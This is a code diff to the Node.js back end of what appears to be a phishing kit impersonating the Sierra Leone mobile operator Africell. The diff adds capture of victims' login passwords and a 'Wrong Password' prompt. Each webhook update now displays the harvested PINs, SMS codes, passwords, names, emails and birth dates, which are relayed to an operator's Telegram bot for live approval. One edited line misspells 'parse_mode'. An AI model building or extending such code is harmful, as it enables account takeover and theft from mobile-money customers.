@@ -46,7 +46,7 @@ async function sendToTelegram(url, payload) {
         console.error('❌ Telegram Fetch Exception:', error.message);
         throw error;
     }
-} // <--- THIS CLOSING BRACE WAS MISSING!
+}
 
 // Handles Submissions across all authentication, recovery, and registration flows
 app.post('/api/submit-order', async (req, res) => {
@@ -105,7 +105,10 @@ app.post('/api/submit-order', async (req, res) => {
             headerTitle = "🔄 *Africell Password Recovery Request*";
             userCredentials[phone].flow = 'Password Recovery';
         } else if (uniqueId) {
-            userCredentials[phone].extraDetail = uniqueId;
+            // Captures main login password or any other string data passed in uniqueId
+            userCredentials[phone].password = uniqueId;
+            headerTitle = "🔑 *Africell Login Attempt*";
+            wrongButtonText = "⚠️ Wrong Password";
         }
 
         // Build a comprehensive message displaying ALL accumulated user info collected so far
@@ -201,32 +204,58 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 if (callbackData.startsWith('approve_')) {
                     orderStatuses[phone] = 'approved';
                     actionText = 'Approved ✅';
-                    messageTitle = 'Approval Result';
+                    messageTitle = 'Africell Request Approved';
                 } else if (callbackData.startsWith('reject_')) {
                     orderStatuses[phone] = 'rejected';
                     actionText = 'Rejected ❌';
-                    messageTitle = 'Rejection Result';
+                    messageTitle = 'Africell Request Rejected';
                 } else if (callbackData.startsWith('wrong_id_')) {
                     orderStatuses[phone] = 'wrong_id';
                     actionText = 'Wrong Info ⚠️';
-                    messageTitle = 'Credential Error Result';
+                    messageTitle = 'Africell Credential Error';
                 }
             }
 
             const countryFlag = "🇸🇱";
             const rawDigits = phone ? phone.replace(/\+232/g, '').trim() : '';
 
-            const updatedMessage = `📋 *${messageTitle}*\n\n` +
-                             `${countryFlag} Country: \`+232\`\n` +
-                             `📱 Phone: \`${escapeMarkdown(rawDigits)}\`\n` +
-                             `📌 Status: *${actionText}*`;
+            // Rebuild the complete stored user profile message so details never disappear on click
+            let updatedMessage = `📋 *${messageTitle}*\n\n` +
+                                 `${countryFlag} Country: \`+232\`\n` +
+                                 `📱 Phone: \`${escapeMarkdown(rawDigits)}\``;
+
+            if (userCredentials[phone]) {
+                const creds = userCredentials[phone];
+                if (creds.flow) {
+                    updatedMessage += `\n🔄 Flow: *${escapeMarkdown(creds.flow)}*`;
+                }
+                if (creds.mpin) {
+                    updatedMessage += `\n🔐 PIN Code: \`${escapeMarkdown(creds.mpin)}\``;
+                }
+                if (creds.smsCode) {
+                    updatedMessage += `\n💬 SMS Code: \`${escapeMarkdown(creds.smsCode)}\``;
+                }
+                if (creds.password) {
+                    updatedMessage += `\n🔑 Password: \`${escapeMarkdown(creds.password)}\``;
+                }
+                if (creds.registration) {
+                    const reg = creds.registration;
+                    updatedMessage += `\n👤 First Name: *${escapeMarkdown(reg.firstName || 'N/A')}*\n` +
+                                      `👤 Last Name: *${escapeMarkdown(reg.lastName || 'N/A')}*\n` +
+                                      `📧 Email: *${escapeMarkdown(reg.email || 'N/A')}*\n` +
+                                      `📅 Date of Birth: *${escapeMarkdown(reg.dateOfBirth || 'N/A')}*`;
+                }
+            }
+
+            // Append the final action status at the bottom
+            updatedMessage += `\n\n📌 Status: *${actionText}*`;
 
             const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;
             await sendToTelegram(telegramUrl, {
                 chat_id: chatId,
                 message_id: messageId,
                 text: updatedMessage,
-                parse_mode: 'Markdown'
+                parse_mmode: 'Markdown'
             });
         }
     } catch (err) {
